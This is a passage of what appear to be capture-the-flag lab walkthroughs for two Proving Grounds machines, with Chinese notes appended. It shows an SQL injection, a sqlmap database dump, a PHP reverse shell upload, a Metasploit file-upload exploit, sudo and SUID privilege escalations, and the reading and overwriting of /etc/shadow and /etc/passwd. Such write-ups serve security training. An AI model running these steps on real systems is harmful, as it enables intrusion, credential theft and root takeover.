<p>We can try a simple payload to test for SQLi vulnerabilities <code>&#39; or 1=1; --</code>, like so:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.120.224/store/book.php?bookisbn=%27%20or%201=1;%20--</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>And we see that this application indeed seems to be vulnerable based on the following verbose error:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Can&#x27;t retrieve data You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;--&#x27;&#x27; at line 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a><strong>SQLMap</strong></h3><p>Since the website directory for the store is aptly names <code>store</code>, we can venture an educated guess that the underlying database might also be named <code>store</code>. Using <code>sqlmap</code>, we can automate the exploitation and leak database contents:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sqlmap -u http://192.168.120.224/store/book.php?bookisbn= --dump-all --batch -D store</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.4.10#stable&#125;</span><br><span class="line">|_ -| . [.]     | .&#x27;| . |</span><br><span class="line">|___|_  [&#x27;]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Database: store</span><br><span class="line">Table: admin</span><br><span class="line">[1 entry]</span><br><span class="line">+-------+--------------------------------------------------+</span><br><span class="line">| name  | pass                                             |</span><br><span class="line">+-------+--------------------------------------------------+</span><br><span class="line">| admin | d033e22ae348aeb5660fc2140aec35850c4da997 (admin) |</span><br><span class="line">+-------+--------------------------------------------------+</span><br><span class="line">...</span><br><span class="line">kali@kali:~$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>And we have obtained the user credentials <code>admin:admin</code> via this vulnerability.</p>
<h3 id="File-Upload-Vulnerability"><a href="#File-Upload-Vulnerability" class="headerlink" title="File Upload Vulnerability"></a><strong>File Upload Vulnerability</strong></h3><p>Having logged in with the recovered or guessed credentials <code>admin:admin</code> at <a href="http://192.168.120.224/store/admin.php">http://192.168.120.224/store/admin.php</a>, we are redirected to <a href="http://192.168.120.224/store/admin_book.php">http://192.168.120.224/store/admin_book.php</a>. This page shows a listing of existing books.</p>
<p>In addition, we see a link to <code>Add new book</code> in the top-left portion of the screen that leads us to <a href="http://192.168.120.224/store/admin_add.php">http://192.168.120.224/store/admin_add.php</a>. Here, it looks like we are able to upload a new file to the store.</p>
<p>We can try uploading a PHP reverse shell from PentestMonkey:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ cp /usr/share/webshells/php/php-reverse-shell.php .</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We will be sure to change IP address and port as needed:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ cat php-reverse-shell.php</span><br><span class="line">&lt;?php</span><br><span class="line">// php-reverse-shell - A Reverse Shell implementation in PHP</span><br><span class="line">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$ip = &#x27;192.168.118.3&#x27;;  // CHANGE THIS</span><br><span class="line">$port = 4444;       // CHANGE THIS</span><br><span class="line">...</span><br><span class="line">kali@kali:~$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>There is one caveat in the upload process: the <code>Publisher</code> text field cannot be arbitrary and must be one of several choices. We can easily view these choices on the page <a href="http://192.168.120.224/store/publisher_list.php">http://192.168.120.224/store/publisher_list.php</a>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.224/store/publisher_list.php&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;  &lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;...&lt;div class=&quot;container&quot; id=&quot;main&quot;&gt;   &lt;p class=&quot;lead&quot;&gt;List of Publisher&lt;/p&gt;        &lt;ul&gt;                        &lt;li&gt;                        &lt;span class=&quot;badge&quot;&gt;2&lt;/span&gt;                    &lt;a href=&quot;bookPerPub.php?pubid=1&quot;&gt;Wrox&lt;/a&gt;                &lt;/li&gt;                        &lt;li&gt;                        &lt;span class=&quot;badge&quot;&gt;2&lt;/span&gt;                    &lt;a href=&quot;bookPerPub.php?pubid=2&quot;&gt;Wiley&lt;/a&gt;                &lt;/li&gt;                        &lt;li&gt;                        &lt;span class=&quot;badge&quot;&gt;3&lt;/span&gt;                    &lt;a href=&quot;bookPerPub.php?pubid=3&quot;&gt;O&#x27;Reilly Media&lt;/a&gt;                &lt;/li&gt;                        &lt;li&gt;                        &lt;span class=&quot;badge&quot;&gt;3&lt;/span&gt;                    &lt;a href=&quot;bookPerPub.php?pubid=4&quot;&gt;Apress&lt;/a&gt;                &lt;/li&gt;                        &lt;li&gt;                        &lt;span class=&quot;badge&quot;&gt;0&lt;/span&gt;                    &lt;a href=&quot;bookPerPub.php?pubid=5&quot;&gt;Packt Publishing&lt;/a&gt;                &lt;/li&gt;                        &lt;li&gt;                        &lt;span class=&quot;badge&quot;&gt;1&lt;/span&gt;                    &lt;a href=&quot;bookPerPub.php?pubid=6&quot;&gt;Addison-Wesley&lt;/a&gt;                &lt;/li&gt;                        &lt;li&gt;                        &lt;a href=&quot;books.php&quot;&gt;List full of books&lt;/a&gt;                &lt;/li&gt;        &lt;/ul&gt;...</span><br></pre></td></tr></table></figure>

<p>We see <code>Apress</code> as one of the choices listed, and we will use this publisher label. The rest of the fields can contain arbitrary data, like so:</p>
<p><img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_58_Image_1_JhTbpxsk.png" alt="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_58_Image_1_JhTbpxsk.png"></p>
<p>If we now return to <a href="http://192.168.120.224/store/admin_book.php">http://192.168.120.224/store/admin_book.php</a>, we will see our new entry added to the top of the list:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ISBN 	Title 	Author 	Image 	Description 	Price 	Publishershell 	shell 	hacker 	php-reverse-shell.php 	shell 	10.00 	Apress 	Edit 	Delete</span><br></pre></td></tr></table></figure>

<p>Next, we will set up a listener on port 4444 and then trigger the reverse shell by navigating to <a href="http://192.168.120.224/store/">http://192.168.120.224/store/</a>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ nc -lvp 4444listening on [any] 4444 ...192.168.120.224: inverse host lookup failed: Unknown hostconnect to [192.168.118.3] from (UNKNOWN) [192.168.120.224] 38114Linux funbox3 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 17:16:51 up  1:03,  0 users,  load average: 0.00, 0.00, 0.00USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can&#x27;t access tty; job control turned off$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)$</span><br></pre></td></tr></table></figure>

<p>And we have a reverse shell as user <code>www-data</code>.</p>
<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><h3 id="User-Credential-Disclosure"><a href="#User-Credential-Disclosure" class="headerlink" title="User Credential Disclosure"></a><strong>User Credential Disclosure</strong></h3><p>Enumerating the <em>/home</em> directory, we find an interesting file <strong>/home/tony/password.txt</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ls -l /hometotal 4drwxr-xr-x 2 tony tony 4096 Oct 30 13:11 tony$ ls -l /home/tonytotal 4-rw-rw-r-- 1 tony tony 70 Jul 31 14:39 password.txt$</span><br></pre></td></tr></table></figure>

<p>Inside of it, we find what looks to be the password for the user next to <code>ssh:</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat /home/tony/password.txtssh: yxcvbnmYYYgym/admin: asdfghjklXXX/store: admin@admin.com admin$</span><br></pre></td></tr></table></figure>

<h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a><strong>SSH</strong></h3><p>We can try to SSH to the target with the credentials <code>tony:yxcvbnmYYY</code>, and we succeed:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ ssh -o StrictHostKeyChecking=no tony@192.168.120.224tony@192.168.120.224&#x27;s password:...tony@funbox3:~$ iduid=1000(tony) gid=1000(tony) groups=1000(tony),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)tony@funbox3:~$</span><br></pre></td></tr></table></figure>

<h3 id="Sudo-Enumeration"><a href="#Sudo-Enumeration" class="headerlink" title="Sudo Enumeration"></a><strong>Sudo Enumeration</strong></h3><p>We will first enumerate what this user is able to run with elevated permissions, and we find an array of binaries at our disposal:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tony@funbox3:~$ sudo -lMatching Defaults entries for tony on funbox3:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser tony may run the following commands on funbox3:    (root) NOPASSWD: /usr/bin/yelp    (root) NOPASSWD: /usr/bin/dmf    (root) NOPASSWD: /usr/bin/whois    (root) NOPASSWD: /usr/bin/rlogin    (root) NOPASSWD: /usr/bin/pkexec    (root) NOPASSWD: /usr/bin/mtr    (root) NOPASSWD: /usr/bin/finger    (root) NOPASSWD: /usr/bin/time    (root) NOPASSWD: /usr/bin/cancel    (root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.shtony@funbox3:~$</span><br></pre></td></tr></table></figure>

<p>Of special note are binaries <strong>/usr/bin/pkexec</strong>, <strong>/usr/bin/time</strong>, and <strong>/usr/bin/mtr</strong>. Also, <strong>.smile.sh</strong> does not exist, nor do any of those directories.</p>
<h3 id="Escalation-via-pkexec"><a href="#Escalation-via-pkexec" class="headerlink" title="Escalation via pkexec"></a><strong>Escalation via pkexec</strong></h3><p>First, we are able to escalate our privilege to root using <strong>/usr/bin/pkexec</strong> as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tony@funbox3:~$ whoamitonytony@funbox3:~$ sudo /usr/bin/pkexec /bin/sh# whoamiroot#</span><br></pre></td></tr></table></figure>

<h3 id="Escalation-via-time"><a href="#Escalation-via-time" class="headerlink" title="Escalation via time"></a><strong>Escalation via time</strong></h3><p>Alternatively, we can escalate our privilege to root using <strong>/usr/bin/time</strong> as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tony@funbox3:~$ whoami</span><br><span class="line">tony</span><br><span class="line">tony@funbox3:~$ sudo /usr/bin/time /bin/sh</span><br><span class="line"># whoami</span><br><span class="line">root</span><br><span class="line">#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Reading-System-Files-via-mtr"><a href="#Reading-System-Files-via-mtr" class="headerlink" title="Reading System Files via mtr"></a><strong>Reading System Files via mtr</strong></h3><p>In addition, we are able to read any system file (for example <strong>/etc/shadow</strong>) using <strong>/usr/bin/mtr</strong> as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tony@funbox3:~$ whoami</span><br><span class="line">tony</span><br><span class="line">tony@funbox3:~$ LFILE=/etc/shadow</span><br><span class="line">tony@funbox3:~$ sudo /usr/bin/mtr --raw -F &quot;$LFILE&quot;</span><br><span class="line">/usr/bin/mtr: Failed to resolve host: root:$6$4r./2lj6ZWMvAM8d$a/WAF4NlJsHGELA./0HVNg.dAqY6Aqzws5PHMdWvBkzQbbEgl9BzTINMP2w00yuZcevYuFPfefGxnHT76kuzm1:18564:0:99999:7:::: Name or service not known</span><br><span class="line">...</span><br><span class="line">/usr/bin/mtr: Failed to resolve host: tony:$6$3CcVDtP8rpQ/g1AY$tpRzq31JEsdsbEi4AD7wG5XfgrEwsr0j4vHqSQmkTpYvx.yHrB/xv3pv8Xlko/5P4vzW4v8BC3tG/YPtbbzVN0:18473:0:99999:7:::: Name or service not known</span><br><span class="line">/usr/bin/mtr: Failed to resolve host: lxd:!:18473::::::: Name or service not known</span><br><span class="line">/usr/bin/mtr: Failed to resolve host: mysql:!:18473:0:99999:7:::: Name or service not known</span><br><span class="line">tony@funbox3:~$</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>SQL Injection</tag>
        <tag>File Upload</tag>
        <tag>pkexec Exploit</tag>
        <tag>time Exploit</tag>
        <tag>mtr Exploit</tag>
      </tags>
  </entry>
  <entry>
    <title>HAWordy</title>
    <url>/undefined/HAWordy/</url>
    <content><![CDATA[<h1 id="Exploitation-Guide-for-HAWordy"><a href="#Exploitation-Guide-for-HAWordy" class="headerlink" title="Exploitation Guide for HAWordy"></a><strong>Exploitation Guide for HAWordy</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap 192.168.120.51</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-02 09:51 EST</span><br><span class="line">Nmap scan report for 192.168.120.51</span><br><span class="line">Host is up (0.029s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Dirb"><a href="#Dirb" class="headerlink" title="Dirb"></a><strong>Dirb</strong></h3><p>We can use <code>dirb</code> to brute-force the website’s directories:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ dirb http://192.168.120.51/</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Mon Mar  2 10:01:40 2020</span><br><span class="line">URL_BASE: http://192.168.120.51/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.120.51/ ----</span><br><span class="line">+ http://192.168.120.51/index.html (CODE:200|SIZE:10918)</span><br><span class="line">+ http://192.168.120.51/info.php (CODE:200|SIZE:14)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.120.51/javascript/</span><br><span class="line">+ http://192.168.120.51/server-status (CODE:403|SIZE:279)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.120.51/wordpress/</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="WPScan"><a href="#WPScan" class="headerlink" title="WPScan"></a><strong>WPScan</strong></h3><p>Having discovered the <em>/wordpress</em> directory, we can further scan it with <code>wpscan</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ wpscan --url http://192.168.120.51/wordpress --enumerate p</span><br><span class="line">...</span><br><span class="line">[+] reflex-gallery</span><br><span class="line"> | Location: http://192.168.120.51/wordpress/wp-content/plugins/reflex-gallery/</span><br><span class="line"> | Last Updated: 2019-05-10T16:05:00.000Z</span><br><span class="line"> | [!] The version is out of date, the latest version is 3.1.7</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 3.1.3 (80% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.120.51/wordpress/wp-content/plugins/reflex-gallery/readme.txt</span><br><span class="line"> ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>This scan identified the Wordpress plugin <code>reflex-gallery</code>. The plugin is out of date, and the installed version is vulnerable to arbitrary file upload.</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="File-Upload-Vulnerability"><a href="#File-Upload-Vulnerability" class="headerlink" title="File Upload Vulnerability"></a><strong>File Upload Vulnerability</strong></h3><p>We can use Metasploit framework’s module <code>wp_reflexgallery_file_upload</code> to automatically exploit this vulnerability and gain remote code execution on the target. We can do this as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ msfconsole</span><br><span class="line">...</span><br><span class="line">msf5 &gt; use exploit/unix/webapp/wp_reflexgallery_file_upload</span><br><span class="line">msf5 exploit(unix/webapp/wp_reflexgallery_file_upload) &gt; set rhosts 192.168.120.51</span><br><span class="line">rhosts =&gt; 192.168.120.51</span><br><span class="line">msf5 exploit(unix/webapp/wp_reflexgallery_file_upload) &gt; set targeturi /wordpress</span><br><span class="line">targeturi =&gt; /wordpress</span><br><span class="line">msf5 exploit(unix/webapp/wp_reflexgallery_file_upload) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.118.3:4444</span><br><span class="line">[+] Our payload is at: vygnooMsrtTC.php. Calling payload...</span><br><span class="line">[*] Calling payload...</span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.120.51</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.118.3:4444 -&gt; 192.168.120.51:38504) at 2020-03-02 10:12:05 -0500</span><br><span class="line">[+] Deleted vygnooMsrtTC.php</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2072 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2020/03$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><h3 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a><strong>SUID</strong></h3><p>Looking for binaries with SUID permission leads us to <strong>wget</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2020/03$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">...</span><br><span class="line">/usr/bin/wget</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Because we can run <strong>wget</strong> with elevated privileges, we can use it to overwrite the <strong>/etc/passwd</strong> file and create a new user for ourselves that has root access. First, let’s see the original file:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2020/03$ cat /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br><span class="line">usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin</span><br><span class="line">cups-pk-helper:x:110:116:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin</span><br><span class="line">speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false</span><br><span class="line">whoopsie:x:112:117::/nonexistent:/bin/false</span><br><span class="line">kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin</span><br><span class="line">saned:x:114:119::/var/lib/saned:/usr/sbin/nologin</span><br><span class="line">pulse:x:115:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin</span><br><span class="line">avahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin</span><br><span class="line">colord:x:117:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin</span><br><span class="line">hplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/false</span><br><span class="line">geoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologin</span><br><span class="line">gnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/false</span><br><span class="line">gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/false</span><br><span class="line">raj:x:1000:1000:raj,,,:/home/raj:/bin/bash</span><br><span class="line">mysql:x:122:128:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">sshd:x:124:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">www-data@ubuntu:/home/raj$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We will copy the original file to our attacking machine and save it as <strong>passwd</strong>. Next, we need to generate a new user to append to the file. This can be done with the help of <strong>openssl</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ openssl passwd -1 -salt hacker pass123</span><br><span class="line">$1$hacker$zVnrpoW2JQO5YUrLmAs.o1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We can now append <code>hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash</code> to our copy of <strong>passwd</strong> and save the file. We will host our file using a python web server:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ python -m SimpleHTTPServer 8000</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>In our shell on the target, we will now navigate to the <em>/etc</em> directory and then download our copy of <strong>passwd</strong>, thus overwriting the original and introducing our new user:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2020/03$ cd /etc</span><br><span class="line">cd /etc</span><br><span class="line">www-data@ubuntu:/etc$ wget -O passwd http://192.168.118.3:8000/passwd</span><br><span class="line">wget -O passwd http://192.168.118.3:8000/passwd</span><br><span class="line">--2020-03-02 07:28:44--  http://192.168.118.3:8000/passwd</span><br><span class="line">Connecting to 192.168.118.3:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 2565 (2.5K) [application/octet-stream]</span><br><span class="line">Saving to: &#x27;passwd&#x27;</span><br><span class="line"></span><br><span class="line">passwd              100%[===================&gt;]   2.50K  --.-KB/s    in 0s</span><br><span class="line"></span><br><span class="line">2020-03-02 07:28:44 (159 MB/s) - &#x27;passwd&#x27; saved [2565/2565]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>If we now look at the end of the file, we should see that our user has been successfully appended:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/etc$ tail passwdtail passwdavahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologincolord:x:117:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologinhplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/falsegeoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologingnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/falsegdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/falseraj:x:1000:1000:raj,,,:/home/raj:/bin/bashmysql:x:122:128:MySQL Server,,,:/nonexistent:/bin/falsesshd:x:124:65534::/run/sshd:/usr/sbin/nologinhacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p>All that is left to do is log in as the user <code>hacker</code> with the password <code>pass123</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/etc$ su hacker</span><br><span class="line">su hacker</span><br><span class="line">Password: pass123</span><br><span class="line"></span><br><span class="line">root@ubuntu:/etc# id</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We have obtained a root shell.</p>
<p>Focus：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>将目标中的/etc/shadow文件复制出来</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp /etc/shadow /var/www/html/wordpress/shadow</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget [http://192.168.43.42/wordpress/shadow](http://192.168.43.42/wordpress/shadow)</span><br></pre></td></tr></table></figure>

<p>在KALI中修改shadow文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:X014elvznJq7E:18150:0:99999:7:::</span><br></pre></td></tr></table></figure>

<p>使用新的哈希值修改了前两个冒号之间的字符串</p>
<p>实际上使用了本地/etc/shadow文件中的哈希值（它具有默认密码“ toor ”的哈希值）</p>
<p>将修改后的shadow复制回目标机器中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget [http://192.168.43.31/shadow](http://192.168.43.31/shadow) -O /etc/shadow</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pass：toor</span><br></pre></td></tr></table></figure>

<p>未经验证的SQL注入漏洞（Unauthenticated SQL Injection vulnerability）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/admin/http/wp_symposium_sql_injection</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOSTS 192.168.43.42</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> TARGETURI /wordpress</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>任意文件上传漏洞（Arbitrary File Upload vulnerability）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/unix/webapp/wp_reflexgallery_file_upload</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOSTS 192.168.43.42</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> TARGETURI /wordpress</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>Wordpress</tag>
        <tag>Msfconsole</tag>
        <tag>Shadow</tag>
        <tag>SQL</tag>
        <tag>Upload Exploit</tag>
      </tags>
  </entry>
  <entry>
    <title>Loly</title>
    <url>/undefined/Loly/</url>
